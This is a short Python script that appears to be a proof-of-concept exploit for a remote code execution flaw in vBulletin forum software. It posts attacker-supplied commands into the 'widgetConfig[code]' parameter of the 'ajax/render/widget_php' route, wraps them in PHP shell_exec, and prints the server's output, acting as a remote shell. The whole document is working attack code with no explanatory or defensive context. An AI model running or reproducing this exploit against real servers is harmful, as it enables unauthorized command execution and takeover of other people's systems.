import requests
import sys

if len(sys.argv) != 3:
    sys.exit("Usage: %s <URL to vBulletin> <command>" % sys.argv[0])

params = {"routestring":"ajax/render/widget_php"}

headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"}

try:
     params["widgetConfig[code]"] = "echo shell_exec('"+sys.argv[2]+"');echo md5('vBulletin'); exit;"
     r = requests.post(url = sys.argv[1], data = params)
     if r.status_code == 200 or r.status_code ==403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r.content:
          print r.content.split('be4ea51d962be8308a0099ae1eb3ec63')[0]
     else:
          sys.exit("Exploit failed! :(")
except KeyboardInterrupt:
     sys.exit("\nClosing shell...")
except Exception as e:
     sys.exit(str(e))
